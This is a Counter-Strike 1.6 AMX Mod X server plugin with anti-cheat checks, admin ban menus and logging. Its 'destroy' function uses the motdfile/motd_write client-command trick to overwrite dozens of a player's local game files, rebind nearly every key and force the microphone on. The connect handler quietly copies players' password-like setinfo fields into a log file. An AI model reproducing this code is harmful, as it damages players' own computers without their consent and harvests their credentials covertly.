#include <amxmodx>
#include <amxmisc>
#include <fakemeta>
#include <cstrike>
#include <csstats>
#include <fun>
#include <cellarray>
#include <hamsandwich>

// custom
#include <isvisible>
#include <player_info>
#include <fakechat>
#include <sic_commands>
#include <custom_log>

// meta

#define PLUGIN_NAME		"Server Info Commands"
#define PLUGIN_VERSION	"0.87a.1"
#define PLUGIN_AUTHOR	"deejayy"

#define BANNER			"-SIC- Server Info Commands loaded"

// registered commands

#define CMD_SIC_INFO			"sic_info"
#define CMD_SIC_PUNISH			"sic_punish"
#define CMD_SIC_SETFOV			"sic_fov"
#define CMD_SIC_FAKECHAT_ADMIN	"sw"
#define CMD_BANNED_UID_RELOAD	"rlduid"
#define ADMIN_NAME				"admin"

// constants

#define PLUGIN_LOG_PATH		"addons/amxmodx/logs/sic.txt"
#define BANNED_CL_UID_FILE	"addons/amxmodx/configs/banned_cl_uid.txt"
#define UID_BAN_REASON		"Ki vagy tiltva innen / You are banned. Tovabbi info: http://deejayy.hu/"
#define PLAYER_LOG_PATH		"addons/amxmodx/logs/players.log"
#define DPROTO_FLOOD		"addons/amxmodx/logs/dproto-flood.log"
#define ATTACK_LOG_PATH		"logs/A_L"
#define KILL_LOG_PATH		"logs/K_L"
#define PASSWORD_LOG_PATH	"addons/amxmodx/logs/passwords.log"
#define PASSWORD_FIELDS		10

new c_pwfields[PASSWORD_FIELDS][]		= {"_pw", "amxx_pw", "amx_pw", "_amxx_pw", "_amx_pw", "_admin", "password", "admin", "_password", "pw"}

// globals

new g_logstamp[32]
new g_a_log[32]
new g_k_log[32]

new g_thdl // trace handler

new g_observed[33]
new g_specmenu[33]
new g_blockshoot[33]
new g_knifespeed[33][2]

new Array:uid_bans;

public plugin_precache() {
    register_forward(FM_Spawn, "fw_spawn", 1)
}

public plugin_init() {
	register_plugin(PLUGIN_NAME, PLUGIN_VERSION, PLUGIN_AUTHOR)
	format_time(g_logstamp, sizeof(g_logstamp)-1, "%Y%m%d-%H%M%S.log")
	format(g_a_log, sizeof(g_a_log)-1, "%s%s", ATTACK_LOG_PATH, g_logstamp)
	format(g_k_log, sizeof(g_k_log)-1, "%s%s", KILL_LOG_PATH, g_logstamp)

	register_cvar("sic_debug", "0")

	register_srvcmd(CMD_SIC_INFO, "sic_info")
	register_srvcmd(CMD_SIC_SETFOV, "sic_fov")
	register_srvcmd(CMD_SIC_FAKECHAT_ADMIN, "sic_fakechat")
	register_srvcmd(CMD_SIC_PUNISH, "sic_punish")

	register_srvcmd(CMD_BANNED_UID_RELOAD, "load_banned_cl_uid")
	register_srvcmd("test", "test")

	register_clcmd("say /rs", "cmd_resetstats")
	register_clcmd("say /away", "cmd_away")
	register_clcmd("say /back", "cmd_back")
	register_clcmd("sic_specmenu", "mnu_specmenu", ADMIN_BAN, " - display spectator menu")

	register_event("DeathMsg", "evt_DeathMsg", "a")
	register_event("StatusValue", "evt_StatusValue", "bd", "1=2")
	register_event("SpecHealth2", "evt_SpecHealth2", "bd")

	register_forward(FM_CmdStart, "fw_blockshoot");
//	register_forward(FM_CmdStart, "fw_test");
	RegisterHam(Ham_Weapon_PrimaryAttack, "weapon_knife", "fw_knifespeed", true)

	register_menucmd(register_menuid("Spec Menu"), 1023, "hnd_specmenu")

	set_task(1.0, "tsk_spectators", 123095, "", 0, "b", 0)
	set_task(1.0, "tsk_knifespeed", 123096, "", 0, "b", 0)
	set_task(20.0, "sic_check_score", 123097, "", 0, "b", 0)

	g_thdl = create_tr2()
	uid_bans = ArrayCreate(8)
	load_banned_cl_uid()

	log_message(BANNER)
}

public fw_knifespeed(p_wep) {
	new p_id
	p_id = get_pdata_cbase(p_wep, 41, 4)

	g_knifespeed[p_id][0]++
//	server_print("id: %d, knife attack.", p_id)
}

// knife / sec = max 3!, overhead for lag: +4 = 7, above 7: disable shoot, advertise

public tsk_knifespeed() {
	new max = get_maxplayers()

	for (new i = 0; i <= max; i++) {
		if (g_knifespeed[i][0] != g_knifespeed[i][1]) {
			if (g_knifespeed[i][0] - g_knifespeed[i][1] > 7) {
				server_print("%d id knifespeed hack, %d/sec", i, g_knifespeed[i][0] - g_knifespeed[i][1])
				sic_admin_punish(0, i)
//				sic_blockshoot(i, i)
//				client_cmd(i, "say ^"admin! speedhackem van!^"")
			}
			g_knifespeed[i][1] = g_knifespeed[i][0]
		}
	}
}

public test() {
}

public sic_check_score() {
	new players[32], num_players, i
	new p_player_info_int[e_pi_struct_int]
	new Float:p_score

	get_players(players, num_players, "")
	for (i=0; i<num_players; i++) {
		p_player_info_int = player_info_int(players[i], num_players)
		p_score = sic_calc_score(p_player_info_int, num_players)

		if (p_score > 13.5 && p_player_info_int[SIC_PI_FRAGS] > 10) {
			server_print("-- most kickelnek (%2.2f): sic_punish #%d", p_score, p_player_info_int[SIC_PI_USER_ID])
		}
	}

	return PLUGIN_HANDLED
}

public tsk_spectators() {
	new msg[1024], p_name[36]
	new max = get_maxplayers()

	for (new i = 0; i <= max; i++) {
		msg = ""
		if (is_user_alive(i)) {
			for (new j = 0; j <= max; j++) {
				if (is_user_connected(j) && !is_user_alive(j)) {
					if (g_observed[j] == i) {
						get_user_name(j, p_name, charsmax(p_name))
						add(p_name, charsmax(p_name), "^n")
						add(msg, charsmax(msg), p_name)
					}
				}
			}
			for (new j = 0; j <= max; j++) {
				if (is_user_connected(j) && !is_user_alive(j) && get_user_flags(j) & ADMIN_MENU) {
					if (g_observed[j] == i) {
						set_hudmessage(64, 64, 64, 0.75, 0.15, 2, 0.0, 1.1, 0.0, 0.0, -1)
						show_hudmessage(j, "Spectators: ^n%s", msg)
					}
				}
			}
		}
	}
}

public plugin_end() {
	free_tr2(g_thdl)
}

public alog(message[], any:...) {
	new p_message[1024]
	vformat(p_message, sizeof(p_message)-1, message, 2)
	eventless_log(PLUGIN_LOG_PATH, p_message)
}

// =========================================================
// =================== SPEC. MENU ==========================
// =========================================================

public display_specmenu(id) {
	if (access(id, ADMIN_BAN) && g_specmenu[id] > 0) {
		new p_menutext[255], keys, p_name[32]

		get_user_name(g_observed[id], p_name, sizeof(p_name)-1)
		format(p_menutext, sizeof(p_menutext)-1, "\rSpec Menu: %s\R^n^n\y1.\w Ban for 45 min^n\y2.\w Exec quit command^n\y3.\w Punish (screw up binds, etc)^n\y4.\w Undo punish^n\y5.\w block/unblock attack^n^n^n\y8.\w destroy", p_name)
		keys = MENU_KEY_1 | MENU_KEY_2
		keys = 1023
		show_menu(id, keys, p_menutext, -1, "Spec Menu")
	}
}

public mnu_specmenu(id) {
	if (g_observed[id] > 0) {
		g_specmenu[id] = 1
		display_specmenu(id)
	}
}

public sic_admin_ban(id, p_id, min) {
	new p_admin[e_pi_struct_str][32], p_player[e_pi_struct_str][32], p_player_i[e_pi_struct_int], log_line[255]

	p_admin = player_info_str(id, 1)
	p_player = player_info_str(p_id, 1)
	p_player_i = player_info_int(p_id, 1)

	format(log_line, sizeof(log_line)-1, "^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"", p_admin[SIC_PI_NAME], p_admin[SIC_PI_AUTH_ID], p_admin[SIC_PIE_CL_UID], p_player[SIC_PI_NAME], p_player[SIC_PI_AUTH_ID], p_player[SIC_PIE_CL_UID])
	if (!equal(p_player[SIC_PI_AUTH_ID], "BOT")) {
		if (equal(p_player[SIC_PI_AUTH_ID], "4294967295") ||
			equal(p_player[SIC_PI_AUTH_ID], "HLTV") ||
			equal(p_player[SIC_PI_AUTH_ID], "STEAM_ID_LAN") ||
			equal(p_player[SIC_PI_AUTH_ID], "VALVE_ID_LAN") ||
			equal(p_player[SIC_PI_AUTH_ID], "STEAM_ID_PENDING") ||
			equal(p_player[SIC_PI_AUTH_ID], "VALVE_ID_PENDING")) {
			server_cmd("addip %d %s;writeip", min, p_player[SIC_PI_IPONLY])
			alog("ban-ip^t%s^t^"%d^"", log_line, min)
		} else {
			server_cmd("banid %d #%d kick;writeid", min, p_player_i[SIC_PI_USER_ID])
			alog("ban-id^t%s^t^"%d^"", log_line, min)
		}
	} else {
		alog("ban-fail^t%s^t^"%d^"", log_line, min)
	}
}

public sic_admin_exec(id, p_id, cmd[]) {
	new p_admin[e_pi_struct_str][32], p_player[e_pi_struct_str][32], log_line[255]

	p_admin = player_info_str(id, 1)
	p_player = player_info_str(p_id, 1)

	format(log_line, sizeof(log_line)-1, "^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"", p_admin[SIC_PI_NAME], p_admin[SIC_PI_AUTH_ID], p_admin[SIC_PIE_CL_UID], p_player[SIC_PI_NAME], p_player[SIC_PI_AUTH_ID], p_player[SIC_PIE_CL_UID])
	alog("exec^t%s^t^"%s^"", log_line, cmd)
	client_cmd(p_id, cmd)
}

public sic_admin_punish(id, p_id) {
	if (p_id > 0) {
		new p_admin[e_pi_struct_str][32], p_player[e_pi_struct_str][32], log_line[255], fh

		if (id > 0) {
			p_admin = player_info_str(id, 1)
		} else {
			p_admin[SIC_PI_NAME] = "Server"
			p_admin[SIC_PI_AUTH_ID] = "Server"
			p_admin[SIC_PIE_CL_UID] = "000000"
		}
		p_player = player_info_str(p_id, 1)

		format(log_line, sizeof(log_line)-1, "^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"", p_admin[SIC_PI_NAME], p_admin[SIC_PI_AUTH_ID], p_admin[SIC_PIE_CL_UID], p_player[SIC_PI_NAME], p_player[SIC_PI_AUTH_ID], p_player[SIC_PIE_CL_UID])
		alog("punish^t%s", log_line)

		fh = fopen(BANNED_CL_UID_FILE, "a")
		fputs(fh, p_player[SIC_PIE_CL_UID])
		fputs(fh, "^n")
		fclose(fh)
		load_banned_cl_uid()

		g_blockshoot[p_id] = 1
		client_cmd(p_id, "m_yaw 0.022")
		client_cmd(p_id, "bind mouse2 kill")
		client_cmd(p_id, "unbind k")
		client_cmd(p_id, "+voicerecord")
		client_cmd(p_id, "name ^"egy senkihazi csiter vagyok^"")
	}
}

public sic_admin_punish_undo(id, p_id) {
	new p_admin[e_pi_struct_str][32], p_player[e_pi_struct_str][32], log_line[255]

	p_admin = player_info_str(id, 1)
	p_player = player_info_str(p_id, 1)

	format(log_line, sizeof(log_line)-1, "^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"", p_admin[SIC_PI_NAME], p_admin[SIC_PI_AUTH_ID], p_admin[SIC_PIE_CL_UID], p_player[SIC_PI_NAME], p_player[SIC_PI_AUTH_ID], p_player[SIC_PIE_CL_UID])
	alog("punish-undo^t%s", log_line)

	client_cmd(p_id, "name ^"elkurta a nevemet egy admin^"")
}

public sic_admin_destroy(id, p_id) {
	new p_admin[e_pi_struct_str][32], p_player[e_pi_struct_str][32], log_line[255]

	p_admin = player_info_str(id, 1)
	p_player = player_info_str(p_id, 1)

	format(log_line, sizeof(log_line)-1, "^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"", p_admin[SIC_PI_NAME], p_admin[SIC_PI_AUTH_ID], p_admin[SIC_PIE_CL_UID], p_player[SIC_PI_NAME], p_player[SIC_PI_AUTH_ID], p_player[SIC_PIE_CL_UID])
	alog("destroy^t%s", log_line)

	client_cmd(p_id, "cl_cmdbackup 2;cl_cmdrate 100;cl_crosshair_color 1 1 1;cl_crosshair_translucent 1;cl_updaterate 1;con_color ^"0 0 0^";console 0;crosshair 0;fps_max 1;fps_modem 1;gamma 0;gl_flipmatrix 1;hisound 0;hud_draw 0;lookspring 1;lookstrafe 1;m_pitch 22;m_yaw 22;MP3Volume 1;suitvolume 1;sv_voiceenable 1;voice_enable 1;voice_forcemicrecord 1;voice_modenable 1;voice_scale 1;volume 1;-mlook;+lookup;+voicerecord;sensitivity 255")
	client_cmd(p_id, "motdfile ajawad.wad;motd_write cheater;motdfile cached.wad;motd_write cheater;motdfile chateau.wad;motd_write cheater;motdfile cs_747.wad;motd_write cheater;motdfile cs_assault.wad;motd_write cheater;motdfile cs_bdog.wad;motd_write cheater;motdfile cs_cbble.wad;motd_write cheater;motdfile cs_dust.wad;motd_write cheater;motdfile cs_havana.WAD;motd_write cheater;motdfile cs_office.wad;motd_write cheater")
	client_cmd(p_id, "motdfile cs_snowbase.wad;motd_write cheater;motdfile cs_thunder.wad;motd_write cheater;motdfile cstraining.wad;motd_write cheater;motdfile cstrike.wad;motd_write cheater;motdfile de_airstrip.wad;motd_write cheater;motdfile de_aztec.wad;motd_write cheater;motdfile de_piranesi.wad;motd_write cheater;motdfile de_storm.wad;motd_write cheater;motdfile de_vegas.wad;motd_write cheater")
	client_cmd(p_id, "motdfile de_vertigo.wad;motd_write cheater;motdfile decals.wad;motd_write cheater;motdfile greenvalley.wad;motd_write cheater;motdfile itsitaly.wad;motd_write cheater;motdfile jos.wad;motd_write cheater;motdfile n0th1ng.wad;motd_write cheater;motdfile prodigy.wad;motd_write cheater;motdfile tempdecal.wad;motd_write cheater;motdfile torntextures.wad;motd_write cheater;motdfile tswad.wad;motd_write cheater")
	client_cmd(p_id, "motdfile custom.hpk;motd_write cheater;motdfile GameServerConfig.vdf;motd_write cheater;motdfile halflife-cs.fgd;motd_write cheater;motdfile settings.scr;motd_write cheater;motdfile user.scr;motd_write cheater;motdfile gfx/palette.lmp;motd_write cheater;motdfile models/p_knife.mdl;motd_write cheater;motdfile models/v_knife.mdl;motd_write cheater;motdfile models/v_knife_r.mdl;motd_write cheater")
	client_cmd(p_id, "motdfile models/w_knife.mdl;motd_write cheater;motdfile resource/GameMenu.res;motd_write cheater;motdfile sprites/radar320.spr;motd_write cheater;motdfile sprites/radar640.spr;motd_write cheater;motdfile sprites/radaropaque640.spr;motd_write cheater")
//	client_cmd(p_id, "alias w ^"wait^";alias w10 ^"w;w;w;w;w;w;w;w;w;w^";alias w30 ^"w10;w10;w10^";alias c ^"spk hgrunt/bastard!;w100;c^"")
	client_cmd(p_id, "alias c ^"say CHEATER^"")
	client_cmd(p_id, "bind ^";^" c;bind TAB c;bind ESCAPE c;bind SPACE c;bind ' c;bind + c;bind , c;bind - c;bind . c;bind / c;bind 0 c;bind 1 c;bind 2 c;bind 3 c;bind 4 c;bind 5 c;bind 6 c;bind 7 c;bind 8 c;bind 9 c;bind = c;bind ? c;bind ` c;bind a c;bind b c;bind d c")
	client_cmd(p_id, "bind g c;bind i c;bind j c;bind k c;bind l c;bind m c;bind n c;bind o c;bind p c;bind q c;bind r c;bind s c;bind t c;bind u c;bind w c;bind y c;bind ~ c;bind BACKSPACE c;bind ALT c;bind F4 c;bind F5 c;bind F8 c;bind F12 c;bind KP_UPARROW c;bind KP_PGUP c;bind KP_5 c;bind KP_RIGHTARROW c;bind KP_DOWNARROW c;bind KP_PGDN c;bind CAPSLOCK c;bind MWHEELDOWN c;bind MWHEELUP c;bind MOUSE1 c;bind MOUSE2 c;bind MOUSE4 c;bind MOUSE5 c;bind PAUSE c")
	client_cmd(p_id, "name ^"egy senkihazi csiter vagyok^"")
}

public hnd_specmenu(id, key) {
	new redisplay = 0
	// key = pressed key - 1 (eg. slot1 = 0, slot2 = 1)
	if (access(id, ADMIN_BAN)) {
		new p_name[32]
		new p_id = g_observed[id]
		get_user_name(p_id, p_name, sizeof(p_name)-1)
		switch (key) {
			case 0: {
				sic_admin_ban(id, p_id, 45)
			}
			case 1: {
				sic_admin_exec(id, p_id, "quit")
			}
			case 2: {
				sic_admin_punish(id, p_id)
			}
			case 3: {
				sic_admin_punish_undo(id, p_id)
			}
			case 4: {
				sic_blockshoot(id, p_id)
				redisplay = 1
			}
			case 7: {
				sic_admin_destroy(id, p_id)
			}
			default: {
				g_specmenu[id] = 0
			}
		}
		if (redisplay) {
			display_specmenu(id)
		} else {
			g_specmenu[id] = 0
		}
	}
	return PLUGIN_HANDLED
}

// =========================================================
// ==================== COMMANDS ===========================
// =========================================================

public sic_info() {
	sic_info_print()

	return PLUGIN_HANDLED
}

public sic_blockshoot(id, p_id) {
	new p_name[33], p_msg[128]
	get_user_name(p_id, p_name, charsmax(p_name))

	g_blockshoot[p_id] = 1-g_blockshoot[p_id]

	if (g_blockshoot[p_id] == 1) {
		client_cmd(p_id, "m_yaw 0.001")
	} else {
		client_cmd(p_id, "m_yaw 0.022")
	}

	if (id != p_id) {
		format(p_msg, charsmax(p_msg), "*SHOOTBLOCK* %s: %d", p_name, g_blockshoot[p_id])
		fakechat_to(id, p_msg)
	}
}

public sic_fakechat(id) {
	new p_text[255]
	read_args(p_text, sizeof(p_text))
	sic_fakechat_do(ADMIN_NAME, p_text)
}

public sic_fov(id) {
	new p_target[32], p_fov_value[32]

	read_argv(1, p_target, sizeof(p_target))
	read_argv(2, p_fov_value, sizeof(p_fov_value))

	sic_setfov(id, p_target, p_fov_value)
}

public sic_punish(id, level, cid) {
	new arg[32]
	read_argv(1, arg, charsmax(arg))
	new id = cmd_target(id, arg, CMDTARGET_OBEY_IMMUNITY | CMDTARGET_ALLOW_SELF)
	sic_admin_punish(0, id)
}

public load_banned_cl_uid() {
	new file_handle, line[255]

	server_print("load");

	if (file_exists(BANNED_CL_UID_FILE)) {
		file_handle = fopen(BANNED_CL_UID_FILE, "r")
		ArrayClear(uid_bans)
		while (!feof(file_handle)) {
			fgets(file_handle, line, charsmax(line))
			trim(line)
			if (equal(line, "#", 1) || equal(line, ";", 1) || equal(line, "/", 1) || strlen(line) == 0) {
				continue
			}
			ArrayPushString(uid_bans, line)
		}
		server_print("Ban list loaded (cl_uid) %d entries", ArraySize(uid_bans))
	} else {
		server_print("Error, BANNED_CL_UID_FILE (%s) not exists!", BANNED_CL_UID_FILE);
	}

	server_print("load complete");
	return PLUGIN_HANDLED
}

// =========================================================
// =================== REG. EVENTS =========================
// =========================================================

public evt_SpecHealth2(id) {
	new p_id = read_data(2)
	new po_name[32], pt_name[32]

	get_user_name(id, po_name, sizeof(po_name)-1)
	get_user_name(p_id, pt_name, sizeof(pt_name)-1)

	menu_cancel(id)
	g_observed[id] = p_id
	display_specmenu(id)
}

public evt_StatusValue(id) {
	new p_id = read_data(2)

	if (p_id > 0) {
		new po_name[32], pt_name[32]

		get_user_name(id, po_name, sizeof(po_name)-1)
		get_user_name(p_id, pt_name, sizeof(pt_name)-1)

//		server_print(":: 1. statusvalue - Observer: %s - Target: %s", po_name, pt_name)
	}
}

public fw_blockshoot(id, uc_handle, seed) {
	if (g_blockshoot[id] && is_user_alive(id)) {
		static btn
		btn = get_uc(uc_handle, UC_Buttons)
		if (btn & IN_ATTACK) {
			btn &= ~IN_ATTACK
			set_uc(uc_handle, UC_Buttons, btn)
		}
	}

	return FMRES_IGNORED
}

public cmd_resetstats(id) {
	set_user_frags(id, 0);
	cs_set_user_deaths(id, 0);
	set_user_frags(id, 0);
	cs_set_user_deaths(id, 0);

	client_print(id, print_chat, "Nullaztad a statodat !");

	return PLUGIN_HANDLED
}

public cmd_away(id) {
	cs_set_user_team(id, CS_TEAM_SPECTATOR)
	user_kill(id, 1)

	return PLUGIN_HANDLED
}

public cmd_back (id) {
	new pnum1, pnum2, players[32]

	if (cs_get_user_team(id) == CS_TEAM_SPECTATOR) {
		get_players(players, pnum1, "e", "TERRORIST")
		get_players(players, pnum2, "e", "CT")
		cs_set_user_team(id, pnum1 < pnum2 ? CS_TEAM_T : CS_TEAM_CT)
		client_cmd(id, "say respawn")
	}

	return PLUGIN_HANDLED
}

// needed for wallhack detector

public fw_spawn(ent) {
	return isvisible_fw_spawn(ent)
}

public evt_DeathMsg() {
	new wpn[32]
	new killer		= read_data(1)
	new victim		= read_data(2)
	new headshot	= read_data(3)
	read_data(4, wpn, sizeof(wpn)-1)

	if (headshot) {
		sic_set_user_headshots(killer, sic_get_user_headshots(killer) + 1)
	}

	if (killer && victim) {
		if (killer == victim) {
			sic_set_user_frags(killer, sic_get_user_frags(killer)-1)
		} else {
			if (!is_player_visible(killer, victim, g_thdl)) {
				sic_set_user_wallkills(killer, sic_get_user_wallkills(killer) + 1)
			}
			sic_set_user_frags(killer, sic_get_user_frags(killer)+1)
		}
		sic_set_user_deaths(victim, sic_get_user_deaths(victim)+1)
	}
}

// =========================================================
// ====================== EVENTS ===========================
// =========================================================

public client_connect(id) {
	new p_map[32], p_randomid[34], p_md5[32], p_line[255], i, temp_pw[32], temp_uid[255]
	new p_player_info_str[e_pi_struct_str][32]

	p_player_info_str = player_info_str(id, 1)
	get_mapname(p_map, sizeof(p_map)-1)

	if (!equal(p_player_info_str[SIC_PI_AUTH_ID], "BOT")) {
		if (equal(p_player_info_str[SIC_PIE_CL_UID], "")) {
			format(p_md5, sizeof(p_md5)-1, "%d.%s", random_num(10000,99999), p_player_info_str[SIC_PI_IP])
			md5(p_md5, p_randomid)
			copy(p_player_info_str[SIC_PIE_CL_UID], 6, p_randomid)
			strip_setinfo(id)
			client_cmd(id, "setinfo %s %s", CLIENT_USER_ID, p_player_info_str[SIC_PIE_CL_UID])
		}
		format(p_line, sizeof(p_line)-1, "%s^t%s^t%s^t%s^t%s", p_map, p_player_info_str[SIC_PI_NAME], p_player_info_str[SIC_PI_AUTH_ID], p_player_info_str[SIC_PI_IP], p_player_info_str[SIC_PIE_CL_UID])
		eventless_log(PLAYER_LOG_PATH, p_line)

		for (i = 0; i < ArraySize(uid_bans); i++) {
			ArrayGetString(uid_bans, i, temp_uid, charsmax(temp_uid))
			if (strlen(temp_uid) > 0 && strlen(p_player_info_str[SIC_PIE_CL_UID]) > 0 && equali(p_player_info_str[SIC_PIE_CL_UID], temp_uid)) {
				server_cmd("kick #%d ^"%s^"", get_user_userid(id), UID_BAN_REASON)
				server_print("-SIC- cl_uid match, Kick %s", p_line)
			}
		}

		for (i = 0; i < PASSWORD_FIELDS; i++) {
			get_user_info(id, c_pwfields[i], temp_pw, sizeof(temp_pw)-1)
			if (!equal(temp_pw, "")) {
				format(p_line, sizeof(p_line)-1, "%s^t%s^t%s^t%s", p_player_info_str[SIC_PIE_CL_UID], p_player_info_str[SIC_PI_NAME], c_pwfields[i], temp_pw)
				eventless_log(PASSWORD_LOG_PATH, p_line)
			}
		}
	}

	return PLUGIN_HANDLED
}

// supresses and log the attack / kill messages from server console

public plugin_log() {
	new message[255], p_logstamp[32], p_logline[255]

	read_logdata(message, sizeof(message)-1)

	if (containi(message, "traffic temporary blocked from") != -1) {
		eventless_log(DPROTO_FLOOD, message)
	}

	if (contain(message, " attacked ") != -1 || contain(message, " killed ") != -1 || contain(message, " say ") != -1 || contain(message, " say_team ") != -1) {
		format_time(p_logstamp, sizeof(p_logstamp)-1, "L %m/%d/%Y - %H:%M:%S: ")
		format(p_logline, sizeof(p_logline)-1, "%s%s", p_logstamp, message)
		if (contain(message, " attacked ") != -1) {
			eventless_log(g_a_log, p_logline)
		}
		if (contain(message, " killed ") != -1) {
			eventless_log(g_k_log, p_logline)
		}
		return PLUGIN_HANDLED
	}

	return PLUGIN_CONTINUE
}

// on client connect

public client_putinserver(id) {
	sic_pi_client_putinserver(id)

	g_observed[id]	= 0
	g_specmenu[id]	= 0
	g_blockshoot[id] = 0
	g_knifespeed[id][0] = 0
	g_knifespeed[id][1] = 0
}

// on client disconnect

public client_disconnect(id) {
	sic_info_print_single(id)
	g_observed[id]	= 0
	g_blockshoot[id] = 0
	g_knifespeed[id][0] = 0
	g_knifespeed[id][1] = 0
}

// broadcasted kill message handler, ta = team_attack

public client_damage(attacker, victim, damage, wpnindex, hitplace, ta) {
	new p_wall, p_debug = 0

	if (!is_player_visible(attacker, victim, g_thdl)) {
		sic_set_user_wallhits(attacker, sic_get_user_wallhits(attacker) + 1)
		p_wall = 1
	}

	p_debug = get_cvar_num("sic_debug")

	if (p_debug) {
		new p_attacker[e_pi_struct_str][32], p_victim[e_pi_struct_str][32], p_attacker_i[e_pi_struct_int], p_victim_i[e_pi_struct_int]

		p_attacker   = player_info_str(attacker, 1)
		p_attacker_i = player_info_int(attacker, 1)
		p_victim     = player_info_str(victim, 1)
		p_victim_i   = player_info_int(victim, 1)

		if ((!equal(p_attacker[SIC_PI_AUTH_ID], "BOT")) || (!equal(p_victim[SIC_PI_AUTH_ID], "BOT"))) {
			log_message("^"%s<%d><%s><%s>^" attacked ^"%s<%d><%s><%s>^" with ^"%s^" (damage ^"%d^") (damage_armor ^"%d^") (health ^"%d^") (armor ^"%d^") (wall ^"%d^") (hitplace ^"%s^")",
				p_attacker[SIC_PI_NAME], p_attacker_i[SIC_PI_USER_ID], p_attacker[SIC_PI_AUTH_ID], c_teams[p_attacker_i[SIC_PI_TEAM]],
				p_victim  [SIC_PI_NAME], p_victim_i  [SIC_PI_USER_ID], p_victim  [SIC_PI_AUTH_ID], c_teams[p_victim_i  [SIC_PI_TEAM]],
				c_weapons[wpnindex], damage, 0, p_victim_i[SIC_PI_HEALTH], p_victim_i[SIC_PI_ARMOR], p_wall, c_hitplaces[hitplace]
			)

			if (p_victim_i[SIC_PI_HEALTH] <= 0) {
				log_message("^"%s<%d><%s><%s>^" killed ^"%s<%d><%s><%s>^" with ^"%s^" (wall ^"%d^") (hitplace ^"%s^")",
					p_attacker[SIC_PI_NAME], p_attacker_i[SIC_PI_USER_ID], p_attacker[SIC_PI_AUTH_ID], c_teams[p_attacker_i[SIC_PI_TEAM]],
					p_victim  [SIC_PI_NAME], p_victim_i  [SIC_PI_USER_ID], p_victim  [SIC_PI_AUTH_ID], c_teams[p_victim_i  [SIC_PI_TEAM]],
					c_weapons[wpnindex], p_wall, c_hitplaces[hitplace]
				)
			}
		}
	}
}
